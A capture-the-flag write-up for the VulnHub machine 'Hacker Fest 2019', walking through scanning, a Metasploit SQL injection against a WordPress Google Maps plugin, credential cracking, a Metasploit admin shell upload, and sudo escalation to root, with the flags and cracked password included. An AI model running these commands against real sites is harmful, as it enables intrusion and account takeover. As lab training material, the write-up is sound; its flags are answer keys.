---
name: "Hacker Fest 2019"
platform: VulnHub
category: Web
os: Linux
difficulty: Easy
points: 30
ip: 192.168.1.3
date: "2019-10-18"
tools:
  - netdiscover
  - nmap
  - wpscan
  - msfconsole
  - ssh
userFlag: "83cad236438ff0c0dbce55d7f0034aee18f5c39e"
rootFlag: "3dcdf93d2976321d7a8c47a6bb2d48837d330624"
tags:
  - wordpress
  - wpscan
  - sqli
  - metasploit
  - shell-upload
  - sudo
description: "Exploit a WordPress installation using wp_google_maps_sqli to extract credentials, upload an admin shell via Metasploit, and escalate privileges using sudo."
---

## Reconnaissance

The machine was part of a workshop for Hacker Fest 2019 in Prague. After turning on the machine in VirtualBox, we first need to discover its IP address on the local network.

We use `netdiscover` to find the IP address of the destination machine.

```bash
netdiscover
```

Once we have the IP address (in this case, `192.168.1.3`), we perform an Nmap scan to find out which ports are open.

```bash
nmap -sV 192.168.1.3
```

Since port `80` is open, we can visit the website of our vulnerable machine in the browser.

## Enumeration

The vulnerable machine is running a WordPress site. We will use the `wpscan` tool to enumerate users, themes, plugins, and look for known vulnerabilities in the WordPress installation.

```bash
wpscan --url http://192.168.1.3
```

The scan reveals a vulnerable plugin: Google Maps.

## Foothold

We will use the Metasploit framework to exploit the SQL injection vulnerability in the WordPress Google Maps plugin (`wp_google_maps_sqli`).

First, we set up the exploit and configure the target host.

```bash
msfconsole
use auxiliary/admin/http/wp_google_maps_sqli
set RHOSTS 192.168.1.3
exploit
```

The exploit successfully extracts the login password hash for the user. We save this password hash into a `.txt` file and crack it. The cracked credentials are:
- Username: `webmaster`
- Password: `kittykat1`

Now that we have successfully obtained the login information, we can use Metasploit again to upload a shell and gain remote access to the system.

```bash
msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS 192.168.1.3
set USERNAME webmaster
set PASSWORD kittykat1
exploit
shell
```

We now have a shell on the system as the `www-data` user.

## Privilege Escalation

Our goal now is to become the root user. We have the password for the `webmaster` user (`kittykat1`), so we can try to SSH into the machine directly or simply switch users.

```bash
ssh webmaster@192.168.1.3
```

When prompted, we enter the password `kittykat1`.

Once logged in as `webmaster`, we check what commands we can run with `sudo`.

```bash
sudo -l
```

It prompts for the password again (`kittykat1`). We see that `webmaster` has broad sudo privileges. We can easily escalate to root by spawning a root bash shell.

```bash
sudo bash
```

We are now the root user. We can navigate to the root directory and read the final flag!
